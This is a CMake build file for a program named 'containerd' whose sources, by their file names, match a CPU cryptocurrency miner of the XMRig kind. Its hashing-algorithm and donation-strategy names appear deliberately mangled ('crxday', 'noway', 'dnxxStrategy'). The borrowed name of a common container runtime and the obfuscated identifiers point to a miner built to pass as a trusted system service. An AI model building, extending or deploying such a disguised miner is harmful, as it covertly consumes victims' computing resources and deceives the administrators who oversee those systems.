cmake_minimum_required(VERSION 2.8)
project(containerd)

option(WITH_LIBCPUID "Use Libcpuid" ON)
option(WITH_noway     "crxday-Lite support" OFF)
option(WITH_HTTPD    "HTTP REST API" OFF)
option(BUILD_STATIC  "Build static binary" OFF)

include (CheckIncludeFile)
include (cmake/cpu.cmake)


set(HEADERS
    src/api/Api.h
    src/api/ApiState.h
    src/api/NetworkState.h
    src/App.h
    src/Console.h
    src/log/ConsoleLog.h    
    src/Cpu.h
    src/interfaces/IClientListener.h
    src/interfaces/IConsoleListener.h
    src/interfaces/IJobResultListener.h
    src/interfaces/ILogBackend.h
    src/interfaces/IStrategy.h
    src/interfaces/IStrategyListener.h
    src/interfaces/IWorker.h
    src/Mem.h
    src/net/Client.h
    src/net/Id.h
    src/net/Job.h
    src/net/JobResult.h
    src/net/Network.h
    src/net/strategies/dnxxStrategy.h
    src/net/strategies/FailoverStrategy.h
    src/net/strategies/SinglenodemasterStrategy.h
    src/net/SubmitResult.h
    src/net/Url.h
    src/Options.h
    src/Platform.h
    src/version.h
    src/workers/DoubleWorker.h
    src/workers/Handle.h
    src/workers/hxshr.h
    src/workers/SingleWorker.h
    src/workers/Worker.h
    src/workers/Workers.h
    src/containerd.h
   )

set(HEADERS_crxx
    src/crxx/c_blake256.h
    src/crxx/c_groestl.h
    src/crxx/c_jh.h
    src/crxx/c_keccak.h
    src/crxx/c_skein.h
    src/crxx/crxday.h
    src/crxx/crxday_remixx.h
    src/crxx/crxday_test.h
    src/crxx/groestl_tables.h
    src/crxx/hxsh.h
    src/crxx/skein_port.h
    src/crxx/soft_aes.h
   )

if (containerd_ARM)
    set(HEADERS_crxx "${HEADERS_crxx}" src/crxx/crxday_arm.h)
else()
    set(HEADERS_crxx "${HEADERS_crxx}" src/crxx/crxday_x86.h)
endif()

set(SOURCES
    src/api/Api.cpp
    src/api/ApiState.cpp
    src/api/NetworkState.cpp
    src/App.cpp
    src/Console.cpp
    src/Mem.cpp
    src/net/Client.cpp
    src/net/Job.cpp
    src/net/Network.cpp
    src/net/strategies/dnxxStrategy.cpp
    src/net/strategies/FailoverStrategy.cpp
    src/net/strategies/SinglenodemasterStrategy.cpp
    src/net/SubmitResult.cpp
    src/net/Url.cpp
    src/Options.cpp
    src/Platform.cpp
    src/workers/DoubleWorker.cpp
    src/workers/Handle.cpp
    src/workers/hxshr.cpp
    src/workers/SingleWorker.cpp
    src/workers/Worker.cpp
    src/workers/Workers.cpp
    src/containerd.cpp
    src/log/ConsoleLog.cpp
   )

set(SOURCES_crxx
    src/crxx/c_keccak.c
    src/crxx/c_groestl.c
    src/crxx/c_blake256.c
    src/crxx/c_jh.c
    src/crxx/c_skein.c
    src/crxx/crxday.cpp
   )

if (WIN32)
    set(SOURCES_OS
        src/App_win.cpp
        src/Cpu_win.cpp
        src/Mem_win.cpp
        src/Platform_win.cpp
        )

    add_definitions(/DWIN32)
    set(EXTRA_LIBS ws2_32 psapi iphlpapi userenv)
elseif (APPLE)
    set(SOURCES_OS
        src/App_unix.cpp
        src/Cpu_mac.cpp
        src/Mem_unix.cpp
        src/Platform_mac.cpp
        )
else()
    set(SOURCES_OS
        src/App_unix.cpp
        src/Cpu_unix.cpp
        src/Mem_unix.cpp
        src/Platform_unix.cpp
        )

    set(EXTRA_LIBS pthread rt)
endif()

if (CMAKE_SYSTEM_NAME STREQUAL FreeBSD)
    set(EXTRA_LIBS ${EXTRA_LIBS} kvm)
endif()

if (CMAKE_SYSTEM_NAME MATCHES "Linux")
    EXECUTE_PROCESS(COMMAND uname -o COMMAND tr -d '\n' OUTPUT_VARIABLE OPERATING_SYSTEM)
endif()

add_definitions(/D__STDC_FORMAT_MACROS)
add_definitions(/DUNICODE)
#add_definitions(/DAPP_DEBUG)

set(CMAKE_MODULE_PATH ${CMAKE_MODULE_PATH} "${CMAKE_SOURCE_DIR}/cmake")

find_package(UV REQUIRED)

include(cmake/flags.cmake)

if (WITH_LIBCPUID)
    add_subdirectory(src/3rdparty/libcpuid)

    include_directories(src/3rdparty/libcpuid)
    set(CPUID_LIB cpuid)
    set(SOURCES_CPUID src/Cpu.cpp)
else()
    add_definitions(/Dcontainerd_NO_LIBCPUID)

    if (containerd_ARM)
        set(SOURCES_CPUID src/Cpu_arm.cpp)
    else()
        set(SOURCES_CPUID src/Cpu_stub.cpp)
    endif()
endif()

if (NOT WITH_noway)
    add_definitions(/Dcontainerd_NO_noway)
endif()

if (WITH_HTTPD)
    find_package(MHD)

    if (MHD_FOUND)
        include_directories(${MHD_INCLUDE_DIRS})
        set(HTTPD_SOURCES src/api/Httpd.h src/api/Httpd.cpp)
    else()
        message(FATAL_ERROR "microhttpd NOT found: use `-DWITH_HTTPD=OFF` to build without http deamon support")
    endif()
else()
    set(MHD_LIBRARY "")
    add_definitions(/Dcontainerd_NO_HTTPD)
    add_definitions(/Dcontainerd_NO_API)
endif()

include_directories(src)
include_directories(src/3rdparty)
include_directories(${UV_INCLUDE_DIR})

if (BUILD_STATIC)
    set(CMAKE_EXE_LINKER_FLAGS " -static")
endif()

add_executable(containerd ${HEADERS} ${SOURCES} ${SOURCES_OS} ${SOURCES_CPUID} ${HEADERS_crxx} ${SOURCES_crxx} ${HTTPD_SOURCES})
target_link_libraries(containerd ${UV_LIBRARIES} ${MHD_LIBRARY} ${EXTRA_LIBS} ${CPUID_LIB})
